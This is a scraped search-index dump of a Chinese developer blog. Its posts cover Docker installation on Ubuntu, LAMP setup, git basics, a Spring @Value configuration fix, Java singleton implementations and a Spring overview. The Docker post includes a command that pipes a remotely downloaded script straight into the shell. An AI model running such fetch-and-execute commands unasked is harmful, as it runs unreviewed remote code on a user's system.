此后的所有servlet的初始化都按照3步中方式创建，初始化自己的上下文环境，将WebApplicationContext设置为自己的父上下文环境。 图示其间关系 参考地址1，2","tags":[{"name":"spring mvc","slug":"spring-mvc","permalink":"http://yoursite.com/tags/spring-mvc/"}]},{"title":"Ubuntu安装docker","date":"2017-04-27T10:51:57.000Z","path":"2017/04/27/Ubuntu安装docker/","text":"简要步骤step 1 wget -qO- https://get.docker.com/ | sh 结果如下 note 我个人在ubuntu虚拟机中实验，32位的安装docker时，执行该命令有问题。什么i836的。64为的没有问题。 在结果图中，更改docker运行用户的问题，不改的话，如果执行docker run hello-world时会有问题 docker: Cannot connect to the Docker daemon. Is … 报了docker守护线程没有开启，用ps -ef看了下是开启的。其实是用sudo docker run命令才对，不过还是有点问题。 step 21sudo usermod -aG docker (yourUsername) step 312wyh@ubuntu:~$ sudo service docker startwyh@ubuntu:~$ sudo docker run hello-world 运行结果： 最后附上关闭docker服务的命令sudo service docker stop ================================================更新，下面是一些实践 安装ubuntu镜像（images） sudo docker run ubuntu 说明：初次运行会检查本地是否有ubuntu镜像的虚拟机，如果没有将会从镜像库docker hub上下载公共镜像。sudo docker run ubuntu echo &quot;hello world&quot;该命令会在ubuntu虚拟机中执行echo命令并输出hello world。note运行交互式容器sudo docker run -it ubuntu -t:在新容器内指定一个伪终端或终端。 -i:允许你对容器内的标准输入 (STDIN) 进行交互。进入交互式容器，说明你已经在容器内了，可以像使用ubuntu一样使用命令行。退出交互式容器ctrl+D 启动容器（后台模式） 使用以下命令创建一个以进程方式运行的容器 sudo docker run -d ubuntu:15.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot; 在输出中，我们没有看到期望的”hello world”，而是一串长字符 cf69880d847fb97e6eb8b5b2e513a9123a0b3e3d3fbdd4503b8ab14df1236923 这个长字符串叫做容器ID，对每个容器来说都是唯一的，我们可以通过容器ID来查看对应的容器发生了什么。 首先，我们需要确认容器有在运行，可以通过 sudo docker ps 来查看。结果如下： wyh@ubuntu:~$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES cf69880d847f ubuntu &quot;/bin/sh -c &apos;while...&quot; 7 seconds ago Up 7 seconds tender_stonebraker 查看容器内的标准输出wyh@ubuntu:~$ sudo docker logs cf69880d847fb97e6e 停止容器sudo docker stop cf69880d847f 为了验证容器是否停止，查看容器镜像运行进程sudo docker ps 查看docker的命令sudo docker 查看某个命令的帮助docker command --help 运行一个web应用尝试使用 docker 构建一个 web 应用程序。 在docker容器中运行一个 Python Flask 应用来运行一个web应用。 sudo docker run -d -P training/webapp python app.py 参数说明: -d:让容器在后台运行。 -P:将容器内部使用的网络端口映射到我们使用的主机上。 运行sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 8d1cb9c07119 training/webapp &quot;python app.py&quot; About a minute ago Up About a minute 0.0.0.0:32768-&gt;5000/tcp confident_rosalind 接下来再本机浏览器中输入http://127.0.0.1:32768/即可查看到内容，127.0.0.1也可以换成docker的ip，试过了，一样！ 指定端口sudo docker run -d -p 5000:5000 training/webapp python app.py 1234567891011121314151617181920212223242526272829303132333435wyh@ubuntu:~$ sudo docker port flamboyant_neumann 查看某容器的端口5000/tcp -&gt; 0.0.0.0:5000wyh@ubuntu:~$ sudo docker logs -f 202 查看容器内部的标准输出（-f:让 dokcer logs 像使用 tail -f 一样来输出容器内部的标准输出。） * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)172.17.0.1 - - [27/Apr/2017 12:24:16] \"GET / HTTP/1.1\" 200 -172.17.0.1 - - [27/Apr/2017 12:24:16] \"GET /favicon.ico HTTP/1.1\" 404 -172.17.0.1 - - [27/Apr/2017 12:24:16] \"GET /favicon.ico HTTP/1.1\" 404 -^Z[7]+ 已停止 sudo docker logs -f 202wyh@ubuntu:~$ sudo docker top 202 查看容器内进程UID PID PPID C STIME TTY TIME CMDroot 15167 15149 0 20:22 ? 00:00:00 python app.pywyh@ubuntu:~$ sudo docker inspect 202 它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。runoob@runoob:~$ docker inspect determined_swanson[ &#123; \"Id\": \"7a38a1ad55c6914b360b565819604733db751d86afd2575236a70a2519527361\", \"Created\": \"2016-05-09T16:20:45.427996598Z\", \"Path\": \"python\", \"Args\": [ \"app.py\" ], ...wyh@ubuntu:~$ sudo docker ps -l 查看最后一次启动的容器CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES202def58eb83 training/webapp \"python app.py\" 10 minutes ago Exited (137) 22 seconds ago flamboyant_neumannwyh@ubuntu:~$ sudo docker restart 202 重启（最后一次启动的）容器wyh@ubuntu:~$ sudo docker stop 202202 停止容器wyh@ubuntu:~$ sudo docker rm 202202 移除容器wyh@ubuntu:~$ sudo docker restart 202 查看是否成功移除Error response from daemon: No such container: 202 =============================5月7号晚上更新 自定义docker镜像 创建Dockerfile文件 编写如下内容 from hub.c.163.com/library/tomcat #拓展自哪个镜像 MAINTAINER laowang 643710049@qq.com #用户名。邮箱 COPY jpress.war /usr/local/tomcat/webapps/ #copy本地文件到镜像目标文件夹 docker build -t jpress:latest .提示如下 1234567891011 Sending build context to Docker daemon 20.8MBStep 1/3 : FROM hub.c.163.com/library/tomcat ---&gt; 1f6eab5f63d3Step 2/3 : MAINTAINER laowang 643710049@qq.com ---&gt; Running in becafadad4b1 ---&gt; 6639dfe8255fRemoving intermediate container becafadad4b1Step 3/3 : COPY jpress.war /usr/local/tomcat/webapps/ ---&gt; af1cb028eaa0Removing intermediate container 88c6cbcb6a6bSuccessfully built af1cb028eaa0 成功了 docker命令大全外链","tags":[{"name":"docker","slug":"docker","permalink":"http://yoursite.com/tags/docker/"}]},{"title":"Ubuntu16.04 install LAMP","date":"2017-04-25T13:47:56.000Z","path":"2017/04/25/Ubuntu16-04-install-LAMP/","text":"linux下开发必备环境 安装apache2 1sudo apt-get install apache2 安装结果 /etc/apache2/ |-- apache2.conf | `-- ports.conf |-- mods-enabled | |-- *.load | `-- *.conf |-- conf-enabled | `-- *.conf |-- sites-enabled | `-- *.conf 项目文件在/var/www/ 启动apache2服务 service apache2 start 打开浏览器，打开http://127.0.0.1/进行验证 安装php7 12345678sudo apt-get install php7.0 sudo apt-get install libapache2-mod-php7.0 // 配置APACHE+PHP7的sudo apt-get install libapache2-mod-php // 这个应该是配置APACHE+PHP5的，一块装吧sudo /etc/init.d/apache2 restart // 重启 在项目目录里创建测试文件test.php内容如下： hello php &lt;?php phpinfo(); ?&gt; 浏览器打开http://127.0.0.1/test.php进行验证 -安装mysql1apt-get install mysql-server mysql-client notemysql-server：用来创建和管理数据库实例，提供相关接口供不同客户端调用;mysql-client：操作数据库实例的的一个命令行工具，像图形化界面工具有phpmyadmin等;mysqld：即MySQL servermysql：即mysql-client客户端命令行工具 启动服务service mysql start 验证是否开启mysql服务 ps -ef | grep mysql ps：自启动管理工具 apt-get install sysv-rc-conf","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"使用git的基本式jgit的基本（优雅）方式“","date":"2017-04-21T15:17:55.000Z","path":"2017/04/21/使用git的基本式jgit的基本（优雅）方式“/","text":"从开始使用git到养成习惯，就是这么简单先上图表示一下基本流程 首先下载git for windows,直接安装。 添加SSH KEY，在github上“setting”里面按照步骤进行。 在github上创建一个仓库，例如test。 在本地的项目（test项目）文件夹下右键Git bash here。 输入 git init，这个命令会在项目目录下生成一个.git的目录，这里面存放的就是项目的版本库和git配置文件。 为了利用github给你智能生成的.gitignore和readme.md文件，先将github上的仓库pull一下，在git bash终端输入git pull https://github.com/~~~/test.git 添加项目更新，git add . 提交项目更新，git commit -m “first time commit” 建立远程仓库，git remote add origin https://github.com/~~~/test.git push更新，git push -u origin master 这样本地仓库就与github上面仓库建立联系啦，以后就可以愉快的玩耍了。 PS：下面附赠git常用命令行","tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"spring基于@Value绑定属Bean性失","date":"2017-04-20T09:34:52.000Z","path":"2017/04/20/spring基于-Value绑定属Bean性失/","text":"用spring注解@Value绑定属性失败环境： eclipse Version: Luna Release (4.4.0) spring 4.0 Junit4 其他依赖包 描述：JsrDAO类，在该类中使用了SpEL和spring注解12345678910111213141516171819202122232425262728293031323334package com.laowang.annotationBase;import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.ImportResource;import org.springframework.stereotype.Repository;@Repository(\"dao\")@ImportResource(\"classpath*:jdbc.properties\")public class JsrDAO &#123; @Value(\"$&#123;url&#125;\")//加载配置文件中key为url的value值注入 private String url; @Value(\"$&#123;name&#125;\") private String name; @Value(\"$&#123;password&#125;\") private String password; public void save()&#123; System.out.println(\"jsr saving...\"); System.out.println(\"url: \"+url); System.out.println(\"name: \"+name); System.out.println(\"password: \"+password); &#125; public void init()&#123; System.out.println(\"init jsrDAO Bean ...\"); &#125; public void destroy()&#123; System.out.println(\"destroy jsrDAO Bean ...\"); &#125;&#125; 资源文件内容 url=http\\://localhost\\:3306/database name=root password=root JavaConfig类，Bean的装配工作12345678910111213141516package com.laowang.annotationBase;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.context.annotation.ImportResource;import org.springframework.test.context.ContextConfiguration;@Configurationpublic class JavaConfig &#123; @Bean(name=\"dao\", initMethod=\"init\", destroyMethod=\"destroy\") public JsrDAO getJseDAO()&#123; return new JsrDAO(); &#125;&#125; 测试类1234567891011121314151617181920package com.laowang.annotationBase;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.test.context.ContextConfiguration;import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes=JavaConfig.class)public class TestA &#123; @Autowired private JsrDAO jsDao; @Test public void testDAO()&#123; jsDao.save(); &#125;&#125; 结果获得数据显示为 init jsrDAO Bean ... jsr saving... url: ${url} name: ${name} password: ${password} destroy jsrDAO Bean ... 问题出现在用SpEL占位符绑定bean的三个属性没有成功，正确的结果应该是这样的 init jsrDAO Bean ... jsr saving... url: http://localhost:3306/database name: root password: root destroy jsrDAO Bean ... 问题出现在哪里呢？按理说应该不会错的。于是百度、谷歌搜索，都没解决，最后去了spring官方文档看到正确使用方式 所以只需要修改JavaConfig文件就可以了，添加一行注解，变成如下： 1234567891011121314151617181920212223package com.laowang.annotationBase;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.context.annotation.ImportResource;@Configuration@ImportResource(\"classpath*:spring-annotationBase.xml\")//这个必须要引入，否者得到配置文件中的值是有问题的，有了这个可以不用在JsrDAO中重配置了，多了也无妨public class JavaConfig &#123; @Bean(name=\"dao\", initMethod=\"init\", destroyMethod=\"destroy\") public JsrDAO getJseDAO()&#123; return new JsrDAO(); &#125; @Bean public JsrService getJsrService()&#123; JsrService service =new JsrService(); service.setJsrDAO(getJseDAO()); return service; &#125; &#125; 同时再添加一个对应的xml配置文件，指定属性配置文件的位置，此时JsrDAo中属性文件位置的指定也可以不用了。下面是对应的xml文件 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;context:property-placeholder location=\"classpath:/properties/jdbc.properties\"/&gt;&lt;/beans&gt; PS：下面补充一点知识关于代理模式，如图 运行时注入 属性占位符（Property Placeholder） Spring 表达式语言SpEL 属性占位符（Property Placeholder） 加载资源配置文件后，通过环境对象（Environment）env获取配置文件内容，如1env.getProperty(\"jdbc.name\"); 具体使用要参考文档 解析属性占位符一般使用SpEL语言SpEL语言特性如下： 使用bean的ID来引用bean 调用方法和访问对象的属性 对值进行算术、关系和逻辑运算 正则表达式匹配 集合操作 详 “#{…}”=======表达式“${…}”=======占位符 字面常量“#{1}”=======计算结果为1 引用bean、属性和方法“#{bean}”=======引用bean“#{bean.attr}”=======计算得到（引用）bean的属性“#{systemProperties[‘jdbc.name’]}”=======通过systemProperties对象引用系统属性（个人理解为引用形同加载配置文件中的属性的值）“#{bean.method()}”=======调用bean的方法“#{bean.method()?.toUpperCase()}”=======方法返回不为空时继续调用toUpperCase()，否则不调用 在表达式中使用类型“#{T(java.lang.Math).random}”=======只能调用类的静态方法和常量 SpEL 运算符不说了 计算正则表达式：文本（matches）正则表达式“#{admin.email matches ‘[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.com’}”=======邮件验证 计算集合“#{bean.list[2].attr}”=======获取bean中结合list第3个元素的attr属性 SpEL 其他运算符 （.?[]）对集合进行过滤。[]里面是表达式“#{bean.list.?[attr eq ‘laowang’]}” .^[] 集合中查询第一个匹配项 .$[] 集合中查询最后一个匹配项","tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"Spring Bean","date":"2017-04-14T01:00:04.000Z","path":"2017/04/14/Spring-Bean/","text":"Spring Bean的相关基础知识先上图： bean的配置 Id bean的唯一标识 *必须 Class 具体实现类 *必须 Scope 作用域范围 singleton ：单例，一个bean容器只存在一份 prototype ：每次请求创建新实例，destroy方式不生效 request ：每次http请求创建一个实例且仅在当前request内有效 session ：同上 global session ：基于protlet的web中有效（portlet中定义了global session），如果在web中，同session Constructor arguments 构造器（构造函数），参数 Properties 属性 Autowiring mode 自动装配模式 lazy-initialization mode 懒加载模式 initialization/destruction method 初始化方法/销毁方法 等… … bean的作用域 singleton ：单例，一个bean容器只存在一份 prototype ：每次请求创建新实例，destroy方式不生效 request ：每次http请求创建一个实例且仅在当前request内有效 session ：同上 global session ：基于protlet的web中有效（portlet中定义了global session），如果在web中，同session bean的生命周期上图： 接下来： 定义 初始化 1.设置全局的初始化方法default-init-method或对单个bean设置init-method 2.实现org.sringframework.beans.factory.InitializingBean接口，覆盖afterPropertiesSet方法 使用 销毁 1.设置全局的销毁方法default-destroy-method或对单个bean设置destroy-method 2.实现org.sringframework.beans.factory.DisposeableBean接口，覆盖destroy方法 bean的自动装配 Spring中提供了一些一Aware结尾的接口，实现了Aware接口的bean在被初始化后，可以获取相应的资源。 通过Aware接口可以对spring相应资源进行操作 设置默认自动装配，spring容器中就不需要再为bean手动设置属性引用关系，容器会自动寻找和bean属性名相同的bean的id，并且自动完成bean的装配： 123456789101112 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"default-autowire=\"byName\"&gt;&lt;bean id=\"injectionDao\" class=\"com.laowang.dao.InjectionDAOImp\"/&gt;&lt;bean id=\"injectionservice\" class=\"com.laowang.service.InjectionServiceImp\"/&gt;&lt;!-- &lt;property name=\"injectiondao\" ref=\"injectionDao\"&gt;&lt;/property&gt;通过设置自动装配，就不用单独为bean装配了 --&gt;&lt;/beans&gt; Resource&amp;ResourceLoader 下面是resourceLoader resourceloader加载文件的location类型 //第一次更新。最近读了spring实战，对spring bean的配置又多了一点知识储备。 装配bean有三种机制 基于xml配置显示的装配bean 基于javaConfig的配置类(@Configuration)显示装配bean 隐式的bean发现机制和自动装配(需要@Configuration和@ComponentScan) 关于第三种机制的使用规制 12345678//spring配置之隐式bean发现和自动装配@Configuration@ComponentScan//也可用Named替换,默认扫面package包内注解//@ComponentScan(basePackages=&#123;\"com.laowang.chapter02\"&#125;)指定扫描的package//@ComponentScan(basePackageClasses=&#123;Cd.class,UseCd.class&#125;)指定扫描的类//@ImportResource(\"classpath:spring-beans.xml\")//public class Config &#123;&#125; 关于第二种机制的使用例子123456789101112131415161718192021222324@Configurationpublic class javaConfig &#123;//只是用@Bean话，bean的id将会初始化为方法名@Bean(name=\"cd\")public Cd getCd()&#123; return new Cd();&#125;//通过setter方法自动装配bean引用@Bean(name=\"useCd\")public UseCd randomMentod()&#123; UseCd useCd = new UseCd(); useCd.setCd(getCd()); return useCd;&#125;//通过构造器自动装配bean// @Bean(name=\"useCd\")// public UseCd getByConstructor()&#123;// return new UseCd(getCd());// &#125;&#125; 关于第一种使用规则就比较多了，需要的时候再搜索吧 接下来是基础的spring bean的注解 @Component 该类作为组建类，告知spring为这个类创建bean @Named//bean命名 @Configuration @ComponentScan @Bean @Import @ImportResource @Inject//注入 @Autowired @ContextConfiguration//从哪加载配置 @Repositroy （PS：下面是web.xml配置文件的详解） web.xml配置详解","tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"单例模式优化详解","date":"2017-04-02T02:26:35.000Z","path":"2017/04/02/单例模式优化详解/","text":"在GoF的23种设计模式中，单例模式是比较简单的一种。然而，有时候越是简单的东西越容易出现问题。下面就单例设计模式详细的探讨一下。 所谓单例模式，简单来说，就是在整个应用中保证只有一个类的实例存在。就像是Java Web中的application，也就是提供了一个全局变量，用处相当广泛，比如保存全局数据，实现全局性的操作等。 1. 最简单的实现 首先，能够想到的最简单的实现是，把类的构造函数写成private的，从而保证别的类不能实例化此类，然后在类中提供一个静态的实例并能够返回给使用者。这样，使用者就可以通过这个引用使用到这个类的实例了。 public class SingletonClass { private static final SingletonClass instance = new SingletonClass(); public static SingletonClass getInstance() { return instance; } private SingletonClass() { } } 如上例，外部使用者如果需要使用SingletonClass的实例，只能通过getInstance()方法，并且它的构造方法是private的，这样就保证了只能有一个对象存在。 2. 性能优化——lazy loaded 上面的代码虽然简单，但是有一个问题——无论这个类是否被使用，都会创建一个instance对象。如果这个创建过程很耗时，比如需要连接10000次数据库(夸张了…:-))，并且这个类还并不一定会被使用，那么这个创建过程就是无用的。怎么办呢？ 为了解决这个问题，我们想到了新的解决方案： public class SingletonClass { private static SingletonClass instance = null; public static SingletonClass getInstance() { if(instance == null) { instance = new SingletonClass(); } return instance; } private SingletonClass() { } } 代码的变化有两处——首先，把instance初始化为null，直到第一次使用的时候通过判断是否为null来创建对象。因为创建过程不在声明处，所以那个final的修饰必须去掉。 我们来想象一下这个过程。要使用SingletonClass，调用getInstance()方法。第一次的时候发现instance是null，然后就新建一个对象，返回出去；第二次再使用的时候，因为这个instance是static的，所以已经不是null了，因此不会再创建对象，直接将其返回。 这个过程就成为lazy loaded，也就是迟加载——直到使用的时候才进行加载。 3. 同步 上面的代码很清楚，也很简单。然而就像那句名言：“80%的错误都是由20%代码优化引起的”。单线程下，这段代码没有什么问题，可是如果是多线程，麻烦就来了。我们来分析一下： 线程A希望使用SingletonClass，调用getInstance()方法。因为是第一次调用，A就发现instance是null的，于是它开始创建实例，就在这个时候，CPU发生时间片切换，线程B开始执行，它要使用SingletonClass，调用getInstance()方法，同样检测到instance是null——注意，这是在A检测完之后切换的，也就是说A并没有来得及创建对象——因此B开始创建。B创建完成后，切换到A继续执行，因为它已经检测完了，所以A不会再检测一遍，它会直接创建对象。这样，线程A和B各自拥有一个SingletonClass的对象——单例失败！ 解决的方法也很简单，那就是加锁： public class SingletonClass { private static SingletonClass instance = null; public synchronized static SingletonClass getInstance() { if(instance == null) { instance = new SingletonClass(); } return instance; } private SingletonClass() { } } 是要getInstance()加上同步锁，一个线程必须等待另外一个线程创建完成后才能使用这个方法，这就保证了单例的唯一性。 4. 又是性能 上面的代码又是很清楚很简单的，然而，简单的东西往往不够理想。这段代码毫无疑问存在性能的问题——synchronized修饰的同步块可是要比一般的代码段慢上几倍的！如果存在很多次getInstance()的调用，那性能问题就不得不考虑了！ 让我们来分析一下，究竟是整个方法都必须加锁，还是仅仅其中某一句加锁就足够了？我们为什么要加锁呢？分析一下出现lazy loaded的那种情形的原因。原因就是检测null的操作和创建对象的操作分离了。如果这两个操作能够原子地进行，那么单例就已经保证了。于是，我们开始修改代码： public class SingletonClass { private static SingletonClass instance = null; public static SingletonClass getInstance() { synchronized (SingletonClass.class) { if(instance == null) { instance = new SingletonClass(); } } return instance; } private SingletonClass() { } } 首先去掉getInstance()的同步操作，然后把同步锁加载if语句上。但是这样的修改起不到任何作用：因为每次调用getInstance()的时候必然要同步，性能问题还是存在。如果……如果我们事先判断一下是不是为null再去同步呢？ public class SingletonClass { private static SingletonClass instance = null; public static SingletonClass getInstance() { if (instance == null) { synchronized (SingletonClass.class) { if (instance == null) { instance = new SingletonClass(); } } } return instance; } private SingletonClass() { } } 还有问题吗？首先判断instance是不是为null，如果为null，加锁初始化；如果不为null，直接返回instance。 这就是double-checked locking设计实现单例模式。到此为止，一切都很完美。我们用一种很聪明的方式实现了单例模式。 5. 从源头检查 下面我们开始说编译原理。所谓编译，就是把源代码“翻译”成目标代码——大多数是指机器代码——的过程。针对Java，它的目标代码不是本地机器代码，而是虚拟机代码。编译原理里面有一个很重要的内容是编译器优化。所谓编译器优化是指，在不改变原来语义的情况下，通过调整语句顺序，来让程序运行的更快。这个过程成为reorder。 要知道，JVM只是一个标准，并不是实现。JVM中并没有规定有关编译器优化的内容，也就是说，JVM实现可以自由的进行编译器优化。 下面来想一下，创建一个变量需要哪些步骤呢？一个是申请一块内存，调用构造方法进行初始化操作，另一个是分配一个指针指向这块内存。这两个操作谁在前谁在后呢？JVM规范并没有规定。那么就存在这么一种情况，JVM是先开辟出一块内存，然后把指针指向这块内存，最后调用构造方法进行初始化。 下面我们来考虑这么一种情况：线程A开始创建SingletonClass的实例，此时线程B调用了getInstance()方法，首先判断instance是否为null。按照我们上面所说的内存模型，A已经把instance指向了那块内存，只是还没有调用构造方法，因此B检测到instance不为null，于是直接把instance返回了——问题出现了，尽管instance不为null，但它并没有构造完成，就像一套房子已经给了你钥匙，但你并不能住进去，因为里面还没有收拾。此时，如果B在A将instance构造完成之前就是用了这个实例，程序就会出现错误了！ 于是，我们想到了下面的代码： public class SingletonClass { private static SingletonClass instance = null; public static SingletonClass getInstance() { if (instance == null) { SingletonClass sc; synchronized (SingletonClass.class) { sc = instance; if (sc == null) { synchronized (SingletonClass.class) { if(sc == null) { sc = new SingletonClass(); } } instance = sc; } } } return instance; } private SingletonClass() { } } 我们在第一个同步块里面创建一个临时变量，然后使用这个临时变量进行对象的创建，并且在最后把instance指针临时变量的内存空间。写出这种代码基于以下思想，即synchronized会起到一个代码屏蔽的作用，同步块里面的代码和外部的代码没有联系。因此，在外部的同步块里面对临时变量sc进行操作并不影响instance，所以外部类在instance=sc;之前检测instance的时候，结果instance依然是null。 不过，这种想法完全是错误的！同步块的释放保证在此之前——也就是同步块里面——的操作必须完成，但是并不保证同步块之后的操作不能因编译器优化而调换到同步块结束之前进行。因此，编译器完全可以把instance=sc;这句移到内部同步块里面执行。这样，程序又是错误的了！ 6. 解决方案 说了这么多，难道单例没有办法在Java中实现吗？其实不然！ 在JDK 5之后，Java使用了新的内存模型。volatile关键字有了明确的语义——在JDK1.5之前，volatile是个关键字，但是并没有明确的规定其用途——被volatile修饰的写变量不能和之前的读写代码调整，读变量不能和之后的读写代码调整！因此，只要我们简单的把instance加上volatile关键字就可以了。 public class SingletonClass { private volatile static SingletonClass instance = null; public static SingletonClass getInstance() { if (instance == null) { synchronized (SingletonClass.class) { if(instance == null) { instance = new SingletonClass(); } } } return instance; } private SingletonClass() { } } 然而，这只是JDK1.5之后的Java的解决方案，那之前版本呢？其实，还有另外的一种解决方案，并不会受到Java版本的影响： public class SingletonClass { private static class SingletonClassInstance { private static final SingletonClass instance = new SingletonClass(); } public static SingletonClass getInstance() { return SingletonClassInstance.instance; } private SingletonClass() { } } 在这一版本的单例模式实现代码中，我们使用了Java的静态内部类。这一技术是被JVM明确说明了的，因此不存在任何二义性。在这段代码中，因为SingletonClass没有static的属性，因此并不会被初始化。直到调用getInstance()的时候，会首先加载SingletonClassInstance类，这个类有一个static的SingletonClass实例，因此需要调用SingletonClass的构造方法，然后getInstance()将把这个内部类的instance返回给使用者。由于这个instance是static的，因此并不会构造多次。 由于SingletonClassInstance是私有静态内部类，所以不会被其他类知道，同样，static语义也要求不会有多个实例存在。并且，JSL规范定义，类的构造必须是原子性的，非并发的，因此不需要加同步块。同样，由于这个构造是并发的，所以getInstance()也并不需要加同步。 至此，我们完整的了解了单例模式在Java语言中的时候，提出了两种解决方案。个人偏向于第二种，并且Effiective Java也推荐的这种方式。 转载自tuoni123的博客","tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://yoursite.com/tags/设计模式/"}]},{"title":"spring初识","date":"2017-03-27T14:30:42.000Z","path":"2017/03/27/spring初识/","text":"Spring 概述 1. Spring 是什么Spring 是一个开源的轻量级 Java SE（ Java 标准版本）/Java EE（ Java 企业版本）开发应用框架，其目的是用于简化企业级应用程序开发。在传统应用程序开发中，一个完整的应用是由一组相互协作的对象组成的。所以开发一个应用除了要开发业务逻辑之外，最多的是关注使这些对象协作来完成所需功能的同时，实现低耦合、高内聚。所以，业务逻辑开发是不可避免的。如果有个框架可以帮我们来创建对象及管理这些对象之间的依赖关系，能通过配置方式来创建对象，管理对象之间依赖关系，我们不需要通过工厂和生成器来创建及管理对象之间的依赖关系，这样我们必然会减少许多工作量，加快开发。Spring 框架问世之初主要就是来完成这个功能。 Spring 框架除了帮我们管理对象及其依赖关系，还提供像通用日志记录、性能统计、安全控制、异常处理等面向切面的能力，可以帮我们管理最头疼的数据库事务，同时，它本身提供了一套简单的 JDBC 访问实现，能与第三方数据库访问框架集成（如 Hibernate、JPA ），与各种 Java EE 技术整合（如 Java Mail、任务调度等等），提供一套自己的 web 层框架 Spring MVC 、而且还能非常简单的与第三方 web 框架集成。从这里我们可以认为 Spring 是一个超级粘合平台，除了自己提供功能外，还提供粘合其他技术和框架的能力，从而使我们可以更自由的选择到底使用什么技术进行开发。而且不管是 JAVA SE（ C/S 架构）应用程序还是 JAVA EE（ B/S 架构）应用程序都可以使用这个平台进行开发。让我们来深入看一下 Spring 到底能帮我们做些什么？ 2. Spring 能帮我们做什么2.1. Spring 能帮我们根据配置文件创建及组装对象之间的依赖关系 传统程序开发，创建对象及组装对象间依赖关系由我们在程序内部进行控制，这样会加大各个对象间的耦合，如果我们要修改对象间的依赖关系就必须修改源代码，重新编译、部署；而如果采用 Spring，则由 Spring 根据配置文件来进行创建及组装对象间依赖关系，只需要改配置文件即可，无需重新编译。 2.2 Spring 面向切面编程能帮助我们无耦合的实现日志记录、性能统计、安全控制 当我们要进行一些日志记录、权限控制、性能统计等工作时，在传统应用程序当中我们可能在需要的对象或方法中进行，而且比如权限控制、性能统计大部分是重复的，这样代码中就存在大量重复代码，即使把通用部分提取出来，仍旧存在重复调用，像性能统计我们可能只是在必要时才进行，在诊断完毕后要删除这些代码；还有日志记录，比如记录一些方法访问日志、数据访问日志等等，这些都会渗透到各个访问方法中；还有权限控制，必须在方法执行时开始进行审核，可见这些工作急需优化。如果采用 Spring ，这些日志记录、权限控制、性能统计从业务逻辑中分离出来，通过 Spring 支持的面向切面编程，动态添加这些功能，无需渗透到各个需要的方法或对象中。反观其他的解决方案，通过使用“代理设计模式”或“包装器设计模式”，仍需通过编程方式来创建代理对象，仍需耦合这些代理对象，而采用 Spring 面向切面编程能提供一种更好的方式来完成上述功能。通过配置方式，而不需要在现有代码中添加任何额外代码，使现有代码专注业务逻辑。 2.3 Spring能非常简单的帮我们管理数据库事务 在传统应用程序当中，我们如何来完成数据库事务管理？需要一系列“获取连接，执行 SQL，提交或回滚事务，关闭连接”，而且还要保证在最后一定要关闭连接，多么可怕的事情，而且也很无聊；如果采用 Spring，我们只需获取连接，执行 SQL，其他的都交给 Spring 来管理，简单方便。 除以上之外，Spring 还可以： 与第三方数据库访问框架（如 Hibernate、JPA ）无缝集成，而且自己也提供了一套 JDBC 访问模板，来方便数据库访问。 与第三方 Web（如 Struts、JSF ）框架无缝集成，而且自己也提供了一套 Spring MVC 框架，来方便 web 层搭建。 与 Java EE（如 Java Mail 、任务调度）整合，与更多技术整合（比如缓存框架）。 3. Spring 的优点3.1 关键概念 应用程序：能完成我们所需要功能的成品，比如购物网站、OA 系统。 框架：能完成一定功能的半成品，比如我们可以使用框架进行购物网站开发；框架做一部分功能，我们自己做一部分功能，辅助高效工作。而且框架规定了你在开发应用程序时的整体架构，提供了一些基础功能，还规定了类和对象的如何创建、如何协作等，从而简化我们的代码编写，让我们专注于业务逻辑开发。 非侵入式设计：从框架角度可以这样理解，无需继承框架提供的类，这种设计就可以看作是非侵入式设计，如果继承了这些框架类，就是侵入设计，如果以后想更换框架，之前写过的代码几乎无法重用，如果非侵入式设计则之前写过的代码仍然可以继续使用。 轻量级与重量级：轻量级是相对于重量级而言的，轻量级一般就是非入侵性的、所依赖的东西非常少、资源占用非常少、部署简单等等，其实就是比较容易使用，而重量级正好相反。 POJO ： POJO （ Plain Ordinary Java Object ）简单的 Java 对象。它可以包含业务逻辑或持久化逻辑，但不担当任何特殊角色且不继承或不实现任何其它 Java 框架的类或接口。 容器：在日常生活中容器就是一种盛放东西的器具，从程序设计角度看就是装对象的的对象，因为存在放入、拿出等操作，所以容器还要管理对象的生命周期。 控制反转：即 Inversion of Control ，缩写为 IoC ，控制反转还有一个名字叫做依赖注入（ Dependency Injection ），就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。 - Bean ：一般指容器管理对象，在 Spring 中指 Spring IoC 容器管理对象。 3.2 Spring 的优点 非常轻量级的容器：以集中的、自动化的方式进行应用程序对象创建和装配，除此之外还会负责管理对象生命周期，能组合成复杂的应用程序。Spring 容器是非侵入式的（不需要依赖任何 Spring 特定类），而且完全采用 